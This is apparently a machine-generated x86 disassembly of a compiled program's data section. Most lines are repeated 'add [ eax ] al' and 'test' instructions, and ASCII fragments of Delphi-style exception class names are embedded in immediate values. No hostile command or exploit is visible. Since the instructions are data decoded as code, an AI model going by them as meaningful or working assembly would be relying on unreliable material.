js r-xdata
clc
cmp [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
inc ebx
add [ eax ] ah
add [ eax ] al
add [ edi + esi - 0x7d93ffbd ] bh
inc esp
add [ edx + eax * 4 + 0x44 ] dh
push esi
inc esp
push ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
cmp al [ ebx ]
and [ eax ] al
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
nop
nop
nop
inc ebx
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
sbb al 0x9e
jo r-xdata
inc ebx
add [ esi ] al
inc ebp
inc ecx
bound ebp [ edi + 0x72 ]
je r-xdata
sahf
jo r-xdata
add [ eax + eax ] al
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
les edx [ esi + 0x44 ]
insb
jae r-xdata
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2000433a ] bh
inc ebp
jb r-xdata
fdivr [ ecx ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
cmp [ ebx ] eax
and [ eax ] al
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax - 0x28 ] 0xd800439e
popfd
inc ebx
add ah ah
sahf
inc ebx
add [ esi + ebx * 4 ] bl
imul ebp [ edi + 0x6e ] 0x43396890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] dh
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax + 0x6c004338 ] ah
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax - 0x28 ] 0xd800439e
popfd
inc ebx
add ah ah
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx ] eax
and [ eax ] al
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
cmp [ ebx ] al
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
imul ebp [ edi + 0x6e ] r-xdata
add [ gs : ebx ] al
push ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_433779
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433780
nop
nop
adc al 0x38
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
cmp [ ebx ] al
sbb al 0x0
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
cmp eax [ ebx ]
and [ eax ] al
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] 0x433b2490
inc ebp
js r-xdata
popad
insb
nop
nop
mov al 0x3a
inc ebx
inc ebp
jb r-xdata
add [ eax ] al
add ah ch
cmp [ ebx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x2000433a
outsd
jb r-xdata
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
cld
cmp eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x3c
jb r-xdata
inc ebx
add [ ecx ] cl
inc ebp
sbb al 0x9e
inc ebx
add [ eax ] ah
add [ eax ] al
add ah cl
cmp al [ ebx ]
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi ] al
outsd
jb r-xdata
dec ecx
outsb
je r-xdata
popad
insb
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
cmp al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ ebx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
cmp al 0x43
add [ eax ] ah
add [ eax ] al
add ah ch
cmp [ ebx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
outsd
jb r-xdata
je r-xdata
nop
nop
cmp eax [ ebx ]
dec ecx
outsb
jbe r-xdata
inc ebp
jb r-xdata
insb
cmp al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c ] dh
inc ebx
add [ eax ] ah
add [ eax ] al
add ah cl
cmp al [ ebx ]
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax * 2 + 0x4f746e49 ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi ] ch
inc ebx
add [ eax ] ah
add [ eax ] al
add ah ch
cmp [ ebx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
outsd
outsb
nop
and al 0x3b
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x433db090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2000433d ] bh
add [ eax ] al
add [ eax + 0x6c00433c ] al
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
outsd
jb r-xdata
nop
nop
inc ebx
add [ edx ] cl
inc ebp
dec ebp
sahf
jb r-xdata
ja r-xdata
inc esp
ja r-xdata
inc esp
cmp eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
cmp eax 0x200043
add [ eax ] al
cmp [ ebx + eax * 2 ] 0x0
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] cl
inc ebp
popad
je r-xdata
or al [ ebp + 0x4d ]
outsd
insb
imul esi [ esi + 0x69 ] 0x3e1c6564
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi ] ah
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax + 0x6c00433c ] al
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ ecx ] cl
inc ebp
dec edi
jbe r-xdata
nop
mov [ esi ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2000433e ] dl
add [ eax ] al
add [ eax + 0x6c00433c ] al
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] cl
jb r-xdata
dec ecx
outsb
jbe r-xdata
insb
outsd
ja r-xdata
inc ebp
push ebp
outsb
jb r-xdata
insb
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
outsd
hlt
sbb al 0x9e
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x90907473
popad
aas
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi + 0x43 ] ch
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
insb
nop
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
je r-xdata
inc ebp
jb r-xdata
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
arpl [ ebx + 0x4f ] bp
jbe r-xdata
push ebx
je r-xdata
jbe r-xdata
and al 0x41
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 ] ch
inc ebx
add [ eax ] ah
add [ eax ] al
add ah ch
cmp [ ebx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
inc ebp
imul esi [ esi + 0x69 ] 0x6567656c
nop
outsb
nop
nop
nop
mov eax 0x4340
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
inc eax
inc ebx
add [ eax ] ah
add [ eax ] al
add ah ch
cmp [ ebx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] cl
inc ebp
push eax
jb r-xdata
imul ebp [ edi + 0x6e ] 0xb8909090
inc eax
inc ebx
add [ eax ] al
outsd
jb r-xdata
jb r-xdata
outsd
insb
inc ebx
nop
add [ ecx ] cl
inc ebp
jb r-xdata
popad
nop
aam 0x3f
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
aas
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ 0x6e6f4345 ] cl
jbe r-xdata
inc ebx
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
nop
inc esp
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 + 0x43 ] cl
add [ eax ] ah
add [ eax ] al
add ah ch
cmp [ ebx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
nop
add [ edx + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc edx
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
nop
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
insb
outsd
ja r-xdata
insb
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax ] dl
inc ebp
inc ecx
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42 ] bh
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
xchg esp eax
inc ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x200043 ] bl
add [ eax ] al
in al dx
cmp [ ebx ] eax
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
jae r-xdata
jb r-xdata
inc ebp
jb r-xdata
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6c696146
nop
nop
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
inc esp
inc ebx
add [ eax + eax ] bl
outsd
jb r-xdata
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
jb r-xdata
sbb al 0x9e
jo r-xdata
push esp
inc ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 + 0x43 ] bl
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
les eax [ ebx + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
inc ebx
inc ebx
add [ eax ] ah
add [ eax ] al
add [ edi + esi - 0x7d93ffbd ] bh
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
sbb al 0x9e
inc ebx
popad
jae r-xdata
in al 0x42
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc edx
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] bl
inc ebp
dec esi
outsd
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x70707553
jo r-xdata
add [ eax + eax ] bl
add [ eax ] al
dec esp
inc esp
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ 0x6e6f4d45 ] dl
imul esi [ edi + ebp * 2 + 0x72 ] 0x6b636f4c
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebp + 0x43 ] al
inc ebx
add [ eax ] cl
inc ebp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x10909090
inc ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc ebp
inc ebx
imul ebp [ edi + 0x6e ] 0x4344a490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 2 + 0x1c0043 ] ch
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
outsd
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
js r-xdata
outsd
jb r-xdata
imul ebp [ edi + 0x6e ] 0x45889090
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
